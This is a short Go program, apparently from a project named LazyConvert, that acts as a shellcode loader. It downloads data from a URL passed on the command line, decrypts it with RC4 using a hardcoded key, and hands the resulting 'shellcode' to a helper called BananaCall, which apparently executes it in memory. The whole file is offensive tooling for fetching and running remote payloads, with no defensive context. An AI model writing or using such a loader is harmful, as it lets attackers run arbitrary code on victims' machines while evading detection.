package main

import (
	"LazyConvert/tool"
	"io/ioutil"
	"net/http"
	"os"
)

func main() {
	key := []byte("ZnVja3lvdQo=")

	resp, err := http.Get(os.Args[1])
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)

	shellcode := tool.Rc4(body, key)
	tool.BananaCall(shellcode)
}
